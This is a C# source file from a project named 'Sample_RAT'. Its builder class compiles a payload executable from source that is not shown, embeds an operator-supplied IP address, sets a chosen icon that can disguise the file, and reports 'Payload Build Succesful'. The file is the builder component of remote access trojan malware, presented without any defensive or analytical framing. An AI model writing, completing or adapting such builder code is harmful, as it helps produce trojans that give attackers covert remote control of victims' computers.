using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.CSharp;
using System.CodeDom.Compiler;

namespace Sample_RAT
{
    class libBuilder
    {
        public static void Build(string ipadd, string iconadd, string filename)
        {
            CSharpCodeProvider provider = new CSharpCodeProvider();
            ICodeCompiler compiler = provider.CreateCompiler();
            CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateExecutable = true;
            parameters.GenerateInMemory = false;
            parameters.OutputAssembly = filename;
            parameters.TreatWarningsAsErrors = false;
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.CompilerOptions = @"/win32icon:" + iconadd;
            CompilerResults result = compiler.CompileAssemblyFromSource(parameters, SourceCode.Code("\"" + ipadd + "\""));
            System.Windows.Forms.MessageBox.Show("Payload Build Succesful", "info", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Information);
            if (result.Errors.Count != 0)
            {
                foreach (CompilerError er in result.Errors)
                {
                    System.Windows.Forms.MessageBox.Show(er.ToString());
                }
            }
        }
    }
}
